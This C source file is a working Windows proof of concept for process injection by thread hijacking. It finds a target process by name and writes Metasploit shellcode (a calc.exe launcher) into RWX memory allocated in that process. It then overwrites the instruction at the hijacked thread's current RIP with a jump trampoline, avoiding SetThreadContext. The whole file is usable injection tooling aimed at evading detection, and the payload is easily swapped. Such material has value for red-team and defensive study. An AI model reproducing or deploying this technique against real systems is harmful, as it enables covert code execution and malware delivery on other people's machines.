/*
*
* Test thread hijacking without calling SetThreadContext.
* The idea is to stomp the memory region pointed to by RIP,
* with a little trampoline that will redirect the execution
* to our payload address, then resume the thread.
*
*/

#include <windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

// comment out to suppress output
//
#define _DBG

#ifdef _DBG
#define DEBUG_PRINT(x, ...) printf(x, ##__VA_ARGS__)
#define _INT getchar()
#else
#define DEBUG_PRINT(x, ...)
#define _INT
#endif


//x64 calc metasploit shellcode 
unsigned char payload[] = {
	0x90, 0x90, 0x90, 0x90, 0x90, 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00
};

// get target process handle using snapshot method
BOOL GetRemoteProcHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcId, OUT HANDLE* hProc)
{
	HANDLE hSnapShot = NULL;
	PROCESSENTRY32 stProc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (INVALID_HANDLE_VALUE == hSnapShot)
	{
		DEBUG_PRINT("[*]CreateToolhelp32Snapshot failed with error: 0x%.8x\n", GetLastError());
		goto _endfunc;
	}

	if (!Process32First(hSnapShot, &stProc))
	{
		DEBUG_PRINT("[-]Process32First failed with error: 0x%.8x\n", GetLastError());
		goto _endfunc;
	}

	do
	{
		WCHAR lowerName[MAX_PATH * 2];

		if (stProc.szExeFile)
		{
			DWORD dwSize = lstrlenW(stProc.szExeFile);
			DWORD i = 0;

			RtlSecureZeroMemory(lowerName, MAX_PATH * 2);

			if (dwSize < MAX_PATH * 2)
			{
				for (; i < dwSize; i++)
					lowerName[i] = (WCHAR)tolower(stProc.szExeFile[i]);

				lowerName[i++] = '\0';
			}
		}

		if (0 == wcscmp(lowerName, szProcessName))
		{
			*dwProcId = stProc.th32ProcessID;
			*hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, stProc.th32ProcessID);
			if (NULL == *hProc)
				DEBUG_PRINT("[-]OpenProcess failed with error: 0x%.8x\n", GetLastError());
			break;
		}
	} while (Process32Next(hSnapShot, &stProc));

_endfunc:
	if (NULL != hSnapShot)
		CloseHandle(hSnapShot);
	if (NULL == *dwProcId || NULL == *hProc)
		return FALSE;

	return TRUE;
}

// get target thread handle using snapshot method
BOOL GetRemoteThrdHandle(IN DWORD dwProcId, OUT DWORD* dwThrdId, OUT HANDLE* hThrd)
{
	HANDLE hSnapShot = NULL;
	THREADENTRY32 stThEntry = {
		.dwSize = sizeof(THREADENTRY32)
	};

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);

	if (INVALID_HANDLE_VALUE == hSnapShot)
	{
		DEBUG_PRINT("[-]CreateToolhelp32Snapshot failed with error: 0x%.8x\n", GetLastError());
		goto _endfunc;
	}

	if (!Thread32First(hSnapShot, &stThEntry))
	{
		DEBUG_PRINT("[-]Thread32First failed with error: 0x%.8x\n", GetLastError());
		goto _endfunc;
	}

	do
	{
		if (stThEntry.th32OwnerProcessID == dwProcId)
		{
			*dwThrdId = stThEntry.th32ThreadID;
			*hThrd = OpenThread(THREAD_ALL_ACCESS, FALSE, stThEntry.th32ThreadID);

			if (NULL == *hThrd)
				DEBUG_PRINT("[-]OpenThread failed with error: 0x%.8x\n", GetLastError());

			break;
		}
	} while (Thread32Next(hSnapShot, &stThEntry));

_endfunc:
	if (NULL != hSnapShot)
		CloseHandle(hSnapShot);
	if (NULL == *dwThrdId || NULL == *hThrd)
		return FALSE;

	return TRUE;
}

// inject shellcode into remote process
BOOL InjectRemoteProc(IN HANDLE hProc, IN PBYTE pShellcode, IN SIZE_T sShellcod, OUT PVOID* ppAddr)
{
	SIZE_T sNumberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;

	*ppAddr = VirtualAllocEx(hProc, NULL, sShellcod, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (NULL == *ppAddr)
	{
		DEBUG_PRINT("[-]VirtualAllocEx failed with error: %d\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("[*]Payload buffer address @ ==========> 0x%p\n", *ppAddr);

	DEBUG_PRINT("[*]Press <Enter> to write payload ..");
	_INT;

	if (!WriteProcessMemory(hProc, *ppAddr, pShellcode, sShellcod, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sShellcod)
	{
		DEBUG_PRINT("[-]WriteProcessMemory failed with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("[*]Done ... %d bytes of payload written ...\n", sNumberOfBytesWritten);

	if (!VirtualProtectEx(hProc, *ppAddr, sShellcod, PAGE_EXECUTE_READWRITE, &dwOldProtection))
	{
		DEBUG_PRINT("[-]VirtualProtectEx failed with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

// perform thread hijacking
BOOL HijackThread(IN HANDLE hProc, IN HANDLE hThrd, IN PVOID pAddr)
{
	CONTEXT ThreadCtx = {
		.ContextFlags = CONTEXT_ALL
	};

	// suspend the thread
	SuspendThread(hThrd);

	if (!GetThreadContext(hThrd, &ThreadCtx))
	{
		DEBUG_PRINT("[-]GetThreadContext failed with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	// get current RIP address
	DWORD64 curRIP = ThreadCtx.Rip;
	DEBUG_PRINT("[*]RIP @ ===========> 0x%p \n", curRIP);

	DEBUG_PRINT("[*]Press Enter to write trampoline ...");
	_INT;

	unsigned char trmpl[] = {
		0x48, 0xb8, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,	// movabs rax, ...
		0xff, 0xe0													// jmp rax
	};
	SIZE_T sBytesWritten = 0x0;
	*(UINT_PTR*)(trmpl + 2) = (UINT_PTR)pAddr;
	//for (DWORD i = 0; i < sizeof(trampoline); i++)
	//{
	//	DEBUG_PRINT("0x%.2x, ", trampoline[i]);
	//}
	if (!WriteProcessMemory(hProc, curRIP, trmpl, sizeof(trmpl), &sBytesWritten))
	{
		DEBUG_PRINT("[-]Write trampoline failed with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	FlushInstructionCache(hProc, curRIP, sizeof(trmpl));

	DEBUG_PRINT("[*]Done ... %d bytes of trampoline written ...\n", sBytesWritten);

	DEBUG_PRINT("[*]Press <Enter> to resume thread ...");
	_INT;

	ResumeThread(hThrd);

	return TRUE;
}

int wmain(int argc, wchar_t** argv)
{
	HANDLE hProc = NULL;
	HANDLE hThrd = NULL;
	DWORD dwProcId = NULL;
	DWORD dwThrdId = NULL;
	PVOID pAddr = NULL;

	if (argc < 2)
	{
		DEBUG_PRINT(L"[-]Usage: \"%ws\" <Process Name> \n", argv[0]);
		return -1;
	}

	DEBUG_PRINT("[*]Trageting process: \"%ws\" ...\n", argv[1]);

	if (!GetRemoteProcHandle(argv[1], &dwProcId, &hProc))
	{
		DEBUG_PRINT("[-]Process not found ...\n");
		return -1;
	}

	DEBUG_PRINT("[*]Found target process @ ==========> %d\n", dwProcId);

	DEBUG_PRINT("[*]Get remote thread handle ... \n");

	if (!GetRemoteThrdHandle(dwProcId, &dwThrdId, &hThrd))
	{
		DEBUG_PRINT("[-]No thread found ...\n");
		return -1;
	}

	DEBUG_PRINT("[*]Found target thread @ ==========> %d\n", dwThrdId);

	DEBUG_PRINT("[*]Inject shellcode ...\n");

	if (!InjectRemoteProc(hProc, payload, sizeof(payload), &pAddr))
	{
		DEBUG_PRINT("[-]Inject shellcode failed ...\n");
		return -1;
	}

	DEBUG_PRINT("[*]Hijacking remote thread ... \n");

	if (!HijackThread(hProc, hThrd, pAddr))
	{
		DEBUG_PRINT("[-]Hijacking remote thread failed ...\n");
		return -1;
	}

	DEBUG_PRINT("[*]DONE ...\n");

	CloseHandle(hThrd);
	CloseHandle(hProc);

	DEBUG_PRINT("[*]Press <Enter> to quit ...");
	_INT;

	return 0;
}
